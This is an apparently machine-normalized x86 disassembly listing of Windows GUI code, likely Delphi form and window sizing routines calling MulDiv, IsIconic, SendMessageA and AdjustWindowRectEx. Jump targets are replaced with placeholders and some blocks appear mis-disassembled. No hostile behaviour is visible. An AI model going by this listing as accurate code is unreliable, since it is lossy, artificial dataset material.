mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_464ef8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_464ef8
mov eax ebx
call sub_4653a0
jmp r-xdata
sub_465420
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
xor eax eax
push ebp
push sub_46550b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_4649c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4649c0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_46502c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_46502c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_46502c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46502c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_46502c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_46502c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_465530
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_44cca4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44ccd0
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_44cca4
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_44ccd0
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44cb90
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_464da8
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_44cb90
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_44cbd4
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_464da8
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_44cb90
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_464da8
mov eax ebx
call sub_44cb90
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_44cbd4
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_44cbd4
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_464da8
mov eax ebx
call sub_44cbd4
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_465684
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_464da8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_464da8
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_464ef8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_464ef8
sub_465728
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465684
mov ecx edi
mov edx esi
mov eax ebx
call sub_453594
pop edi
pop esi
pop ebx
retn
sub_465750
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_4657ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452074
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4657c1
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4657c1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4657f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4653a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465800
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_465800
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_465420
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_465874
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44cbd4
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42a924
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_44cb90
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42a924
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_416e5c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_44faf4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_4658e4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_465945
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_40331c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_452e04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46594c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_465974
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_465ad8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_465ab8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4030d8
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4034f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465abf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_465a80
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4180a4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030e0
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405c50
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8a0
call sub_40395c
sub_465b00
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_40338c
and [ ebx + 0x2f4 ] 0xdf
sub_465b38
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_465144
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_44c8fc
xor edx edx
mov eax ebx
call sub_44c920
mov edx 0x140
mov eax ebx
call sub_44c948
mov edx 0xf0
mov eax ebx
call sub_44c96c
mov dl 0x1
mov eax [ r-xdata ]
call sub_429eb8
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_466454
mov dl 0x1
mov eax [ r-xdata ]
call sub_42435c
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_44bd68
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4030d8
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4667b8
xor edx edx
mov eax ebx
call sub_44d350
xor edx edx
mov eax ebx
call sub_44d2b8
mov dl 0x1
mov eax ebx
call sub_453bc8
mov edx ebx
mov eax [ rw-data ]
call sub_46ae1c
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_465cb1
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_4209f4
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41860c
xor edx edx
mov eax ebx
call sub_41b824
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_469cc4
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_465d1c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_40355c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_465de6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_468640
mov eax [ ebp - 0x4 ]
call sub_453d8c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46ae54
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403190
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403190
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d1d0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4651bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465ded
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_465e00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_465e41
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4667b8
sub_465e46
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_40338c
test al al
jne r-xdata
call sub_4039d8
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_403984
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4667b8
sub_465e7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push j_sub_403670#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_465edc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44f248
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_40338c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_468184
sub_465f18
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c65c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_418314
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403160
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_46757c
mov edx esi
mov eax ebp
call sub_41860c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_467554
mov edx esi
mov eax edi
call sub_46757c
jmp r-xdata
xor edx edx
mov eax edi
call sub_467530
sub_466024
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_450320
xor edx edx
push ebp
push sub_46627a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fa7c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cba8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44cbec
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4663ac
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44e340
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466281
mov eax [ ebp - 0x4 ]
call sub_450328
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_465684
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45354c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_465684
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45354c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423c20
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_423c28
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_466289
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450dc8
push 0x0
push 0x0
push ebx
push sub_466390
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_46635c
push ebx
push sub_466374
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_46633b
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41bf1c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_44d2b8
sub_4663c7
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_465684
mov ecx edi
mov edx esi
mov eax ebx
call sub_45354c
mov eax ebx
call sub_4664b0
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_423cc4
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423ce0
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44cbd4
mov ebp eax
push edi
push esi
mov eax ebx
call sub_44cb90
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_466758
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_466788
sub_466454
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_453d8c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4687b4
push eax
push 0x1
push 0x80
mov eax ebx
call sub_453a88
push eax
call SendMessageA
pop ebx
retn
sub_4664e8
push ebx
mov ebx eax
mov eax ebx
call sub_467404
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_46657c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_453a88
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_453b50
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_453a88
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_466604
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_45402c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420d78
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420d4c
mov edi eax
mov eax edi
mov si 0xfff1
call sub_40338c
test al al
jne r-xdata
sub_466670
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4030d8
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46669c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_40331c
test al al
je r-xdata
mov eax ebp
call sub_4507b8
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_420d78
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_454074
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_420d4c
mov si 0xfff1
call sub_40338c
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_420d88
jmp r-xdata
sub_466730
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44d374
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44e340
sub_466758
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44cba8
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_466788
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44cbec
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_4667b8
